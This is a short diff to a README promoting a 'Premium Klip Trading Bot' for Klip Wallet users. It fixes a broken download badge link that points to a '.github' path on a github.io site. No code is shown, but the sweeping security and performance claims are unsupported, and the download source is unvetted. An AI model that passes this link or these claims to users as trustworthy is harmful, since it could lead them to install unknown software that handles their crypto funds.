@@ -2,7 +2,7 @@
 
 Premium Klip Trading Bot is a cutting-edge automated trading solution tailored for Klip Wallet users. It offers seamless integration, advanced trading strategies, and top-notch security features to elevate your trading experience.
 
-[![Download Premium Klip Trading Bot](https://img.shields.io/badge/Download-Premium_Klip_Trading_Bot-blueviolet)](https;//premium-klip-trading-bot.github.io/.github)
+[![Download Premium Klip Trading Bot](https://img.shields.io/badge/Download-Premium_Klip_Trading_Bot-blueviolet)](https://premium-klip-trading-bot.github.io/.github)
 
 ---
 
